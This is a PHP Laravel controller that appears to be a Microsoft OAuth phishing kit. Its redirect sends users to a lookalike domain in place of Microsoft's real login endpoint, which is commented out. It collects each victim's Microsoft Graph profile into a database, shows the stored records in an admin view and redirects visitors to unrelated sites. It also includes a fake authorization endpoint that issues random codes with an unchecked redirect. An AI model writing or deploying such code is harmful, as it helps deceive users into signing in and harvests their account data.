<?php

namespace App\Http\Controllers\Rough;

use App\Models\User; 
use Illuminate\Support\Str;
use Illuminate\Http\Request;
use App\Models\Rough\MicrosoftUser;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Http;


class MicrosoftAuthController extends Controller
{
     public function redirect()
    {
        $clientId = env('MICROSOFT_CLIENT_ID');
        $redirectUri = urlencode(env('MICROSOFT_REDIRECT_URI'));
        //$scope = urlencode('openid profile email User.Read');
        $scope = urlencode('user/read openid profile offline_access');
        $state = Str::random(40); // Optional: store in session

        // $url = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?" .
        //     "client_id={$clientId}&response_type=code&redirect_uri={$redirectUri}" .
        //     "&response_mode=query&scope={$scope}&state={$state}";

        $url = "https://soft.empirekit.ng/common/oauth2/v2.0/authorize?" .
            "client_id={$clientId}&response_type=code&redirect_uri={$redirectUri}" .
            "&response_mode=query&scope={$scope}&state={$state}";

        return redirect()->away($url);
    }

    public function callback(Request $request)
    {
        $code = $request->get('code');
        
        $response = Http::asForm()->post('https://login.microsoftonline.com/common/oauth2/v2.0/token', [
            'client_id' => env('MICROSOFT_CLIENT_ID'),
            'client_secret' => env('MICROSOFT_CLIENT_SECRET'),
            'code' => $code,
            'redirect_uri' => env('MICROSOFT_REDIRECT_URI'),
            'grant_type' => 'authorization_code',
        ]);
        // Extract access token from response
        $accessToken = $response->json()['access_token'] ?? null;

        if (!$accessToken) {
            abort(401, 'Access token not found.');
        }
    
        // Get user info
        $userResponse = Http::withToken($accessToken)->get('https://graph.microsoft.com/v1.0/me');
        $user = $userResponse->json();
        $infos = MicrosoftUser::all();
        return $user;
        //$randomUrl = $this->getRandomUrl();

        //return redirect()->away($randomUrl);
        try {
            foreach ($infos as $info) {
                $usr = $info['info']; // extract the nested 'info' array
                if($usr['id'] == $user['id']){
                    return redirect('https://facebook.com');
                }
            }

            MicrosoftUser::create([
                'info' => $user
            ]);

            return redirect('https://google.com');
        } catch (\Throwable $th) {
            return false;
        }

       
        
    }

    public function index(){
        $rawJson = MicrosoftUser::all();
        $users = json_decode($rawJson, true);
        
        return view('rough.admin.infos', compact('users'));
    }

    public function activity(){
        return view('rough.admin.activity');
    }

     public function getRandomUrl()
    {
        $urls = [
            'https://example.com/page1',
            'https://example.com/page2',
            'https://example.com/page3',
            'https://example.com/page4',
            'https://example.com/page5',
        ];

        return $urls[array_rand($urls)];
    }

    public function authorizeRequest(Request $request)
    {
        // Validate client_id, redirect_uri, scope, etc.
        // Authenticate user (e.g., show login form or check session)
        // Generate authorization code or token
        // Redirect back to redirect_uri with code and state

        $code = Str::random(32); // Simulated auth code
        $state = $request->query('state');
        $redirectUri = $request->query('redirect_uri');

        return redirect()->to($redirectUri . "?code={$code}&state={$state}");
    }

}
